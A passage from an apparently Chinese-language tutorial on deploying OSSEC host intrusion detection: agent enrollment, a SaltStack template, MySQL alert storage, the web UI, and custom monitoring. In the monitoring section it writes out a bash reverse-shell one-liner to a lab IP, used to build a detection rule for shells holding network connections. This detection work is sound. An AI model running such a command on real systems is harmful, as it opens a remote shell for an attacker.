启动ossec-authd
    [root@localhost syscheck]# /var/ossec/bin/ossec-authd
    2017/07/04 14:11:35 ossec-authd: INFO: Started (pid: 12788).
    [root@localhost syscheck]# netstat -anlp | grep 1515
    tcp        0      0 :::1515                     :::*                        LISTEN      12788/ossec-authd
然后客户端运行，这里如果不指定-A为IP的话，默认是Hostname
    [root@localhost src]# /var/ossec/bin/agent-auth -m 192.168.192.193 -p 1515 -A 192.168.192.196
    2017/07/04 14:27:59 ossec-authd: INFO: Started (pid: 14137).
    2017/07/04 14:27:59 INFO: Connected to 192.168.192.193 at address 192.168.192.193, port 1515
    INFO: Connected to 192.168.192.193:1515
    INFO: Using agent name as: 192.168.192.196
    INFO: Send request to manager. Waiting for reply.
    INFO: Received response with agent key
    INFO: Valid key created. Finished.
    INFO: Connection closed.
查看服务端：
    2017/07/04 14:27:59 ossec-authd: INFO: New connection from 192.168.192.196
    2017/07/04 14:27:59 ossec-authd: INFO: Received request for a new agent (192.168.192.196) from: 192.168.192.196
    2017/07/04 14:27:59 ossec-authd: INFO: Agent key generated for 192.168.192.196 (requested by 192.168.192.196)
    2017/07/04 14:27:59 ossec-authd: INFO: Agent key created for 192.168.192.196 (requested by 192.168.192.196)
重启客户端服务/var/ossec/bin/ossec-control restart
查看当前连接的Agents
    [root@localhost alerts]# /var/ossec/bin/agent_control -lc
    OSSEC HIDS agent_control. List of available agents:
       ID: 000, Name: localhost (server), IP: 127.0.0.1, Active/Local
       ID: 1028, Name: 192.168.192.196, IP: any, Active
启动Agent时的INFO信息
    2017/12/13 09:32:18 ossec-agentd: INFO: Using notify time: 600 and max time to reconnect: 1800
可以看到keepalive的时间间隔为10Min，最大重连时间为30Min。
    [root@sec248 etc]# /var/ossec/bin/agent_control -i 1024 | grep keep
    Last keep alive:     Wed Dec 13 09:34:06 2017
可以查看agent的上次keepalive时间，超过最大重连时间，会有告警。
综合上述两个问题，最终Salt部署模板如下：
    include:
      - mk_Downloads
    install_packages:
      pkg.latest:
        - pkgs:
          - openssl-devel
          - gcc
          - prelink
    install_ossec:
      cmd.run:
        - name: tar zxf ossec.tar.gz && cd ossec && sh install.sh
        - cwd: /root/Downloads
        - unless: test -e /var/ossec/bin/ossec-control
        - require:
          - file: /root/Downloads/ossec.tar.gz
    /var/ossec/etc/ossec.conf:
      file.managed:
        - source: salt://ossec/conf/ossec.conf
        - user: root
        - group: root
        - mode: 644
        - template: jinja
        - require:
          - cmd: install_ossec
    /var/ossec/etc/shared/agent.conf:
      file.managed:
        - source: salt://ossec/conf/agent.conf
        - user: root
        - group: root
        - mode: 644
        - template: jinja
        - require:
          - cmd: install_ossec
    /var/ossec/monitor.sh:
      file.managed:
        - source: salt://ossec/conf/monitor.sh
        - user: root
        - group: root
        - mode: 755
        - template: jinja
        - require:
          - cmd: install_ossec
    /root/Downloads/ossec.tar.gz:
      file.managed:
        - source: salt://ossec/ossec.tar.gz
        - user: root
        - group: root
        - mode: 755
        - template: jinja
        - require:
          - file: /root/Downloads
    agentauth:
      cmd.run:
        - name: /var/ossec/bin/agent-auth -m 10.59.0.248 -p 1515 -A $(ifconfig | egrep -o '10\.(59|211|200).[0-9]{1,3}.[0-9]{1,3}' | head -n 1)
        - unless: test -s /var/ossec/etc/client.keys
        - require:
          - cmd: install_ossec
    serverstart:
      cmd.run:
        - name: /var/ossec/bin/ossec-control restart
        - onchanges:
          - file: /var/ossec/etc/ossec.conf
        - require:
          - cmd: install_ossec
## **0x04 MySQL及WebUI安装**
### Mysql安装：
在2.9之前可以使用make
setdb后编译OSSEC来支持Mysql。默认的安装脚本install.sh是不支持Mysql的，所以需要在源码的src目录下执行
    make TARGET=server DATABASE=mysql install
然后执行
    /var/ossec/bin/ossec-control enable database
创建数据库和导入表结构
    mysql> create database ossec;
    Query OK, 1 row affected (0.00 sec)
    mysql> grant INSERT,SELECT,UPDATE,CREATE,DELETE,EXECUTE on ossec.* to ossec@127.0.0.1;
    Query OK, 0 rows affected (0.00 sec)
    mysql> set password for ossec@127.0.0.1=PASSWORD('hehe123');
    Query OK, 0 rows affected (0.00 sec)
    mysql> flush privileges;
    Query OK, 0 rows affected (0.00 sec)
    mysql> quit
    [root@localhost ossec]# mysql -u root -phehe123 -D ossec 
            127.0.0.1
            ossec
            hehe123
            ossec
            mysql
然后重启服务。
/var/ossec/bin/ossec-dbd启动成功。
    [root@localhost logs]# ps axu | grep dbd | grep -v grep
    ossecm    3919  0.0  0.0  51172  2872 ?        S    10:00   0:00 /var/ossec/bin/ossec-dbd
尝试SSH登录失败，看一下入库信息。
    mysql> select * from alert a join location l on a.location_id = l.id where l.id = 5\G
    *************************** 1. row ***************************
             id: 9
      server_id: 1
        rule_id: 5503
          level: 5
      timestamp: 1499415795
    location_id: 5
         src_ip: 192.168.192.120
         dst_ip: (null)
       src_port: 0
       dst_port: 0
        alertid: 1499415795.28052
           user: root
       full_log: Jul  7 16:23:14 localhost sshd[1589]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.192.120  user=root
      is_hidden: 0
            tld:
             id: 5
      server_id: 1
           name: (192.168.192.196) any->/var/log/secure
    *************************** 2. row ***************************
             id: 10
      server_id: 1
        rule_id: 5716
          level: 5
      timestamp: 1499415800
    location_id: 5
         src_ip: 192.168.192.120
         dst_ip: (null)
       src_port: 0
       dst_port: 0
        alertid: 1499415797.28415
           user: root
       full_log: Jul  7 16:23:16 localhost sshd[1589]: Failed password for root from 192.168.192.120 port 47519 ssh2
      is_hidden: 0
            tld:
             id: 5
      server_id: 1
           name: (192.168.192.196) any->/var/log/secure
    2 rows in set (0.00 sec)
WebUI安装
安装步骤如下：
1）安装gcc
    yum -y install gcc gcc-c++ apr-devel apr-util-devel pcre pcre-devel openssl openssl-devel
2）安装apr（version >= 1.4+ ）
    # wget http://mirrors.tuna.tsinghua.edu.cn/apache/apr/apr-1.5.2.tar.gz
    # tar zxf apr-1.5.2.tar.gz
    # cd apr-1.5.2
    # ./configure --prefix=/usr/local/apr
    # make && make install
3）安装apr-util（version >= 1.4+ ）
    # wget http://mirrors.tuna.tsinghua.edu.cn/apache/apr/apr-util-1.5.4.tar.gz
    # tar zxf apr-util-1.5.4.tar.gz
    # cd apr-util-1.5.4
    # ./configure --prefix=/usr/local/apr-util --with-apr=/usr/local/apr
    # make && make install
4）安装httpd-2.4.27
    # cd httpd-2.4.27
    # ./configure --prefix=/usr/local/apache --with-apr=/usr/local/apr --with-apr-util=/usr/local/apr-util --enable-dav --enable-so --enable-maintainer-mod --enable-rewrite
    # make && make install
    [root@localhost tmp]# wget https://github.com/ossec/ossec-wui/archive/0.9.tar.gz
    [root@localhost tmp]# tar zxvf ossec-wui-0.9.tar.gz
    [root@localhost tmp]# mv ossec-wui-0.9 /var/www/html/ossec-wui
    [root@localhost tmp]# cd /var/www/html/ossec-wui
    [root@localhost ossec-wui]# ./setup.sh
    Setting up ossec ui...
    Username: vincent
    New password:
    Re-type new password:
    Adding password for user vincent
    Enter your web server user name (e.g. apache, www, nobody, www-data, ...)
    apache
    You must restart your web server after this setup is done.
    Setup completed successfully.
    [root@localhost ossec-wui]# service httpd start
## **0x05 监控扩展**
综合上述OSSEC的一些功能点，我们可以扩展一些其他的监控进来，通过OSSEC告警。这里我举几个例子：
1）存在连接的Bash进程
通常情况下Bash进程是不会存在连接状态的，其父进程SSHD存在网络连接，如下：
    [root@sec248 cron.daily]# ps -ef | grep bash | grep -v grep
    root     41011 41009  0 08:42 pts/4    00:00:00 -bash
    root     45984 45982  0 Dec21 pts/1    00:00:00 -bash
    [root@sec248 cron.daily]# netstat -antlp | grep sshd | grep EST
    tcp        0     64 10.59.0.248:22              192.168.190.201:52947       ESTABLISHED 41009/sshd         
    tcp        0      0 10.59.0.248:22              192.168.190.201:2164        ESTABLISHED 45982/sshd
而反弹shell时，反弹命令
    bash -i >& /dev/tcp/192.168.192.144/2345 0>&1，
我们看一下反弹连接
    [root@server120 ~]# netstat -antlp | grep bash
    tcp        0      0 192.168.192.120:34710       192.168.192.144:2345        ESTABLISHED 15497/bash
可以看到存在Bash连接，那么我们添加OSSEC的监控项
        full_command
        netstat -antlp | grep ESTABLISHED | egrep '/(bash|sh)'
### 待补充
2）ssdeep检测webshell  
3）Auditd监控Web中间件  
4）ClamAV查杀部署